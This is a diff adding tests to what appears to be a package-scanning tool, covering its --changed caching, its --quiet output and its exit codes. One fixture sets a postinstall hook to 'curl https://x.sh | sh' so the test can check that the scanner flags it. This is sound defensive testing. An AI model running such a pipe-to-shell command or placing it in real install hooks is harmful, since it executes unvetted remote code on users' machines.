@@ -76,3 +76,35 @@ test('a malformed package.json is still an error', () => {
   writeFileSync(join(dir, 'package.json'), '{ not json');
   assert.equal(run(['scan', dir]).status, 1);
 });
+
+test('scan --changed skips an unchanged project and rescans after an edit', () => {
+  const dir = project({ start: 'node index.js' });
+  const home = tmp();
+  assert.doesNotMatch(run(['scan', '--changed', dir], tmp(), home).stdout, /Unchanged/);
+  assert.match(run(['scan', '--changed', dir], tmp(), home).stdout, /Unchanged since/);
+
+  writeFileSync(join(dir, 'package.json'), JSON.stringify({ name: 'fixture', version: '1.0.1' }));
+  assert.doesNotMatch(run(['scan', '--changed', dir], tmp(), home).stdout, /Unchanged/);
+});
+
+test('scan --quiet prints nothing for a clean project', () => {
+  const dir = project({ start: 'node index.js' });
+  // An empty lockfile: nothing to verify, so no network and no "no lockfile" warning
+  writeFileSync(join(dir, 'package-lock.json'), JSON.stringify({ packages: {} }));
+  const r = run(['scan', '--quiet', dir]);
+  assert.equal(r.status, 0);
+  assert.equal(r.stdout, '');
+});
+
+test('scan --quiet prints one line when something is flagged, and a skip keeps the exit code', () => {
+  const dir = project({ postinstall: 'curl https://x.sh | sh' });
+  const home = tmp();
+  const first = run(['scan', '--changed', '-q', dir], tmp(), home);
+  assert.equal(first.status, 1);
+  assert.equal(first.stdout.trim().split('\n').length, 1);
+  assert.match(first.stdout, /forged: 1 error\(s\)/);
+
+  const skipped = run(['scan', '--changed', '-q', dir], tmp(), home);
+  assert.equal(skipped.status, 1);
+  assert.equal(skipped.stdout, '');
+});
